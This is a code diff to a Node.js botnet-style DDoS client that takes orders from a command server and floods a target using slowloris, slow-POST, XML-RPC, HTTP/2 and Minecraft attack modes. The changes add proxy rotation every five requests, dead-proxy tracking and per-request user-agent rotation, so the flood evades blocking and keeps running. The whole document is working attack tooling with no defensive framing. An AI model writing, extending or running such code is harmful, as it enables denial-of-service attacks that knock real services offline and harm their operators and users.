@@ -81,6 +81,9 @@ let keepAliveInterval = null;
 let http2Sessions = new Map();
 let currentUserAgent = '';
 let currentProxy = null;
+let proxyRequestCount = 0;
+let deadProxies = new Set();
+let currentProxyIndex = 0;
 
 function connect() {
   console.log('[*] Connecting to command server...');
@@ -161,17 +164,22 @@ async function startAttack(config) {
   stats = { sent: 0, success: 0, failed: 0 };
   attackStartTime = Date.now();
   
+  // Reset proxy tracking
+  proxyRequestCount = 0;
+  deadProxies.clear();
+  currentProxyIndex = 0;
+  
   // Set initial user agent and proxy
   currentUserAgent = getRandomUserAgent();
-  currentProxy = config.useProxy ? getRandomProxy() : null;
+  currentProxy = config.useProxy ? rotateProxy() : null;
   
   log(`🎯 Target: ${config.target}`);
   log(`📊 Duration: ${config.duration}s | Threads: ${config.threads} | Delay: ${config.delay}ms`);
   log(`⚡ Attack Mode: ${config.attackMode || 'standard'}`);
-  log(`👤 User-Agent Rotation: ${config.rotateUserAgent ? 'ON' : 'OFF'} (${userAgents.length} loaded)`);
-  log(`🔄 Proxy: ${config.useProxy ? 'ON' : 'OFF'} (${proxies.length} loaded)`);
+  log(`👤 User-Agent Rotation: ${config.rotateUserAgent ? 'ON (every request)' : 'OFF'} (${userAgents.length} loaded)`);
+  log(`🔄 Proxy Rotation: ${config.useProxy ? 'ON (every 5 requests)' : 'OFF'} (${proxies.length} loaded)`);
   if (currentProxy) {
-    log(`📍 Using Proxy: ${currentProxy.host}:${currentProxy.port}`);
+    log(`📍 Starting Proxy: ${currentProxy.host}:${currentProxy.port}`);
   }
   log('🚀 ATTACK STARTED');
   
@@ -217,6 +225,7 @@ async function startAttack(config) {
     console.log(`║  Failed:              ${stats.failed.toString().padStart(16)} ║`);
     console.log(`║  Success Rate:        ${stats.sent > 0 ? ((stats.success/stats.sent)*100).toFixed(1) : '0'}%`.padEnd(41) + '║');
     console.log(`║  Avg Speed:           ${rps.toString().padStart(12)} req/s ║`);
+    console.log(`║  Dead Proxies:        ${deadProxies.size.toString().padStart(16)} ║`);
     console.log('╚════════════════════════════════════════╝');
     isRunning = false;
     attackStartTime = null;
@@ -239,8 +248,21 @@ async function attackThread(config, endTime) {
   
   // Check if target supports HTTP/2 on first request
   let http2Supported = true;
+  let requestsSinceRotation = 0;
   
   while (isRunning && Date.now() < endTime) {
+    // Rotate proxy every 5 requests if enabled
+    if (config.useProxy && requestsSinceRotation >= 5) {
+      currentProxy = rotateProxy();
+      requestsSinceRotation = 0;
+      proxyRequestCount = 0;
+    }
+    
+    // Rotate user agent every request if enabled
+    if (config.rotateUserAgent) {
+      currentUserAgent = getRandomUserAgent();
+    }
+    
     if (isMinecraft) {
       sendMinecraftAttack(config, resolvedIP);
     } else if (isHTTP2 && http2Supported) {
@@ -257,7 +279,9 @@ async function attackThread(config, endTime) {
     } else {
       sendRequestNoWait(config, resolvedIP);
     }
+    
     stats.sent++;
+    requestsSinceRotation++;
     
     if (config.delay > 0) {
       await sleep(config.delay);
@@ -288,7 +312,53 @@ function getRandomUserAgent() {
 
 function getRandomProxy() {
   if (proxies.length === 0) return null;
-  return proxies[Math.floor(Math.random() * proxies.length)];
+  
+  // Filter out dead proxies
+  const aliveProxies = proxies.filter((p, idx) => {
+    const key = `${p.host}:${p.port}`;
+    return !deadProxies.has(key);
+  });
+  
+  if (aliveProxies.length === 0) {
+    // All proxies dead, clear the list and retry
+    deadProxies.clear();
+    log('⚠ All proxies failed, resetting dead proxy list');
+    return proxies[Math.floor(Math.random() * proxies.length)];
+  }
+  
+  // Rotate through alive proxies
+  return aliveProxies[Math.floor(Math.random() * aliveProxies.length)];
+}
+
+function rotateProxy() {
+  if (proxies.length === 0) return null;
+  
+  // Get next alive proxy
+  let attempts = 0;
+  while (attempts < proxies.length) {
+    const proxy = proxies[currentProxyIndex];
+    const key = `${proxy.host}:${proxy.port}`;
+    
+    currentProxyIndex = (currentProxyIndex + 1) % proxies.length;
+    
+    if (!deadProxies.has(key)) {
+      return proxy;
+    }
+    attempts++;
+  }
+  
+  // All proxies dead, reset
+  deadProxies.clear();
+  log('⚠ All proxies failed, resetting dead proxy list');
+  currentProxyIndex = 0;
+  return proxies[0];
+}
+
+function markProxyDead(proxy) {
+  if (!proxy) return;
+  const key = `${proxy.host}:${proxy.port}`;
+  deadProxies.add(key);
+  log(`❌ Proxy dead: ${key} (${deadProxies.size}/${proxies.length} failed)`);
 }
 
 function getRandomHeaders(config) {
@@ -497,11 +567,8 @@ function sendRequestNoWait(config, resolvedIP) {
     const agent = url.protocol === 'https:' ? httpsAgent : httpAgent;
     const mode = config.attackMode || 'standard';
     
-    // Get proxy if enabled
-    const proxy = config.useProxy ? getRandomProxy() : null;
-    if (proxy && config.useProxy) {
-      currentProxy = proxy;
-    }
+    // Use current proxy if enabled
+    const proxy = config.useProxy ? currentProxy : null;
     
     const options = {
       hostname: resolvedIP || url.hostname,
@@ -528,7 +595,7 @@ function sendRequestNoWait(config, resolvedIP) {
       options.headers['Content-Type'] = 'application/json';
     }
     
-    // Proxy support
+    // Proxy support with error tracking
     if (proxy && config.useProxy) {
       const socksOptions = {
         proxy: {
@@ -540,7 +607,8 @@ function sendRequestNoWait(config, resolvedIP) {
         destination: {
           host: options.hostname,
           port: options.port
-        }
+        },
+        timeout: 5000
       };
       
       if (proxy.user && proxy.pass) {
@@ -550,12 +618,23 @@ function sendRequestNoWait(config, resolvedIP) {
       
       SocksClient.createConnection(socksOptions).then(info => {
         options.createConnection = () => info.socket;
-        makeRequest(protocol, options, config, mode);
-      }).catch(() => {
+        
+        // Handle socket errors
+        info.socket.on('error', (err) => {
+          if (err.code === 'ECONNRESET' || err.code === 'ETIMEDOUT' || err.code === 'ECONNREFUSED') {
+            markProxyDead(proxy);
+          }
+          stats.failed++;
+        });
+        
+        makeRequest(protocol, options, config, mode, proxy);
+      }).catch((err) => {
+        // Proxy connection failed
+        markProxyDead(proxy);
         stats.failed++;
       });
     } else {
-      makeRequest(protocol, options, config, mode);
+      makeRequest(protocol, options, config, mode, null);
     }
     
   } catch (error) {
@@ -563,49 +642,57 @@ function sendRequestNoWait(config, resolvedIP) {
   }
 }
 
-function makeRequest(protocol, options, config, mode) {
-  const req = protocol.request(options, (res) => {
-    stats.success++;
-    res.resume();
-  });
-  
-  req.on('error', () => {
-    stats.failed++;
-  });
-  
-  req.on('timeout', () => {
-    stats.failed++;
-    req.destroy();
-  });
-  
-  if (mode === 'slowloris') {
-    req.write('X-');
-    setTimeout(() => {
-      if (!req.destroyed) {
-        req.write('a: b\r\n');
+function makeRequest(protocol, options, config, mode, proxy) {
+  try {
+    const req = protocol.request(options, (res) => {
+      stats.success++;
+      proxyRequestCount++;
+      res.resume();
+    });
+    
+    req.on('error', (err) => {
+      if (proxy && (err.code === 'ECONNRESET' || err.code === 'ETIMEDOUT' || err.code === 'ECONNREFUSED')) {
+        markProxyDead(proxy);
       }
-    }, 10000);
-  } else if (mode === 'slow-post') {
-    const payload = getAttackPayload(config);
-    let sent = 0;
-    const interval = setInterval(() => {
-      if (sent < payload.length && !req.destroyed) {
-        req.write(payload.charAt(sent));
-        sent++;
-      } else {
-        clearInterval(interval);
-        req.end();
+      stats.failed++;
+    });
+    
+    req.on('timeout', () => {
+      stats.failed++;
+      req.destroy();
+    });
+    
+    if (mode === 'slowloris') {
+      req.write('X-');
+      setTimeout(() => {
+        if (!req.destroyed) {
+          req.write('a: b\r\n');
+        }
+      }, 10000);
+    } else if (mode === 'slow-post') {
+      const payload = getAttackPayload(config);
+      let sent = 0;
+      const interval = setInterval(() => {
+        if (sent < payload.length && !req.destroyed) {
+          req.write(payload.charAt(sent));
+          sent++;
+        } else {
+          clearInterval(interval);
+          req.end();
+        }
+      }, 1000);
+    } else {
+      const payload = getAttackPayload(config);
+      if (payload && (config.method === 'POST' || config.method === 'PUT' || config.method === 'PATCH')) {
+        if (mode === 'xmlrpc') {
+          options.headers['Content-Length'] = Buffer.byteLength(payload);
+        }
+        req.write(payload);
       }
-    }, 1000);
-  } else {
-    const payload = getAttackPayload(config);
-    if (payload && (config.method === 'POST' || config.method === 'PUT' || config.method === 'PATCH')) {
-      if (mode === 'xmlrpc') {
-        options.headers['Content-Length'] = Buffer.byteLength(payload);
-      }
-      req.write(payload);
+      req.end();
     }
-    req.end();
+  } catch (error) {
+    stats.failed++;
   }
 }
 
